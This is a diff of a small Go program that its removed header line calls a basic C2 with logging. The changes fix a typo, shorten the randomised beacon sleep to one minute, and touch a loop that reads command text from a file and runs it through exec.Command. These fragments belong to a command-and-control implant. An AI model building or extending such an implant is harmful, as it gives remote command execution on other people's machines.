@@ -1,7 +1,4 @@
-Basic golang c2 with logging
--------------------------------------------
-
-ackage main
+package main
 
 import (
         "fmt"
@@ -20,7 +17,7 @@ func main() {
 
         for {
                 // Generate a random sleep duration between 1 and x minutes
-                sleepDuration := time.Duration(rand.Intn(10)+1) * time.Minute
+                sleepDuration := time.Duration(rand.Intn(1)+1) * time.Minute
 
                 time.Sleep(sleepDuration)
 
@@ -47,7 +44,7 @@ func runCommand() {
         fmt.Printf("Error reading file: %v\n", err)
         return
     }
-  
+
 // Convert the byte slice to a string
     cmdContent := string(fileBytes)
 
@@ -56,7 +53,7 @@ func runCommand() {
 
 // To handle commands with space and args
         args := strings.Split(cmdContent, " ")
-        
+
 // Command Execution
         //cmd := exec.Command(cmdContent)
         cmd := exec.Command(args[0], args[1:]...)
